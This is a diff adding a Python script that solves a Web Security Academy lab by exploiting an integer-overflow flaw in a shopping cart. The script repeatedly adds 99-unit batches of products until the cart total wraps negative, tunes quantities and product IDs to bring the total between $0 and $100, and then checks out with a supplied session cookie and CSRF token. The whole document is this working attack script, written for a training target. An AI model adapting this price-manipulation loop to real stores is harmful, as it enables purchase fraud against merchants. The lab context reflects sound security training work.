@@ -1,0 +1,130 @@
+"""
+Overview
+    This script is designed to exploit a business logic flaw in an e-commerce application, specifically targeting an overflow vulnerability.
+    The vulnerability allows an attacker to manipulate the total price of items in the cart, potentially leading to unintended consequences such as obtaining products for free or at a significantly reduced price.
+"""
+
+import requests # Import the requests module to send requests
+import re # Import the re module to match regexes
+
+# Define the lab ID
+labID = 'LabID-HERE'  # <<< Replace with your lab ID for the web security academy lab
+
+# Authenticate using session cookie
+header = {
+    'Cookie': 'session=Session-HERE'  # <<< Replace with your session cookie for authentication
+}
+
+# Define the CSRF token
+csrf = {
+    'csrf': 'CSRF-HERE'  # <<< Replace with your CSRF token for secure requests
+}
+
+# Define the data to add a product to the cart
+data = {
+    'productId': 1,  # The ID of the product to add to the cart
+    'redir': 'PRODUCT',  # Redirection parameter after adding the product
+    'quantity': 99,  # Maximum quantity of the product to add (limited to 99)
+}
+
+# Define the URLs for each endpoint
+urls = {
+    'product': f'https://{labID}.web-security-academy.net/product?productId={data["productId"]}',  # URL to fetch product details
+    'cart': f'https://{labID}.web-security-academy.net/cart',  # URL to add products to the cart
+    'checkout': f'https://{labID}.web-security-academy.net/cart/checkout'  # URL to checkout the cart
+}
+
+def add_product():  
+    """
+    Add a product to the cart.
+    """
+    try:
+        # Send a POST request to add the product to the cart
+        requests.post(url=urls['cart'], data=data, headers=header)
+        print("Product added to cart successfully.")
+    except requests.RequestException as e:
+        print(f"Failed to add product to cart: {e}")
+
+def product_price():  
+    """
+    Fetch the price of the product.
+    :return: The price of the product as an integer
+    """
+    response = requests.get(url=urls['product'], headers=header)  # Send a GET request to fetch product details
+    response_content = response.content.decode('utf-8')  # Decode the response content to a string
+    price = re.findall(r'"price">\$(\d*).?\d*', response_content)  # Extract the product price using regex
+    if price:
+        price = int(''.join(price).replace('$', ''))  # Convert the price to an integer
+    else:
+        price = 0  # Default price if not found
+    return price
+
+def get_total_price():  
+    """
+    Fetch the total price of items in the cart.
+    :return: The total price as an integer
+    """
+    response = requests.get(url=urls['cart'], headers=header)  # Send a GET request to fetch cart details
+    response_content = response.content.decode('utf-8')  # Decode the response content to a string
+    total = re.findall(r'<th>Total:</th>\s*<th>(-?\$\d*).?\d*</th>', response_content)  # Extract the total price using regex
+    if total:
+        total = int(''.join(total).replace('$', ''))  # Convert the total price to an integer
+    else:
+        total = 0  # Default total if not found
+    return total
+
+def checkout():  
+    """
+    Checkout the cart and complete the purchase.
+    """
+    try:
+        # Send a POST request to checkout the cart
+        requests.post(url=urls['checkout'], data=csrf, headers=header)
+        print("Checked out successfully.")
+        print("You bought the Leather Jacket successfully, and you probably solved the lab!")
+    except:
+        print("Failed to checkout.")
+
+def start():  
+    """
+    Main function to automate the process of adding products, adjusting quantities, and checking out.
+    """
+    break_all = False  # Flag to control breaking out of nested loops
+    product_id = 1  # Start with the first product ID
+    
+    while True:
+        if get_total_price() >= 0:  # Check if the total price in the cart is non-negative
+            add_product()  # Add the product to the cart
+        else:
+            while True:
+                total_price = get_total_price()  # Fetch the current total price in the cart
+                
+                if total_price > 0 and total_price <= 100:  # Check if the total price is within the desired range
+                    print("- Total price is within the desired range amount!\n- Now you're able to checkout your products!")
+                    break_all = True  # Set the flag to break out of all loops
+                    break
+                elif total_price + (product_price() * data['quantity']) > 100:  # Check if adding more products exceeds the limit
+                    print(f'Lowering Quantity! :)')
+                    data['quantity'] -= 10  # Decrease the quantity of the product
+                    if data['quantity'] <= 0:  # Reset the quantity if it goes below zero
+                        data['quantity'] = 99
+                        break
+                else:
+                    add_product()  # Add the product to the cart
+            
+            if break_all:  # Break out of the outer loop if the flag is set
+                break
+            
+            while True:
+                if get_total_price() + (product_price() * data['quantity']) > 100:  # Check if adding more products exceeds the limit
+                    print('Changing Product! :)')
+                    data['productId'] = product_id  # Change the product ID to try a different product
+                    urls['product'] = f'https://{labID}.web-security-academy.net/product?productId={product_id}'
+                    product_id += 1  # Move to the next product ID
+                    if product_id > 20:  # If the product ID exceeds 20, restart from 1
+                        product_id = 1
+                        break
+                else:
+                    break 
+
+start() # Start the program
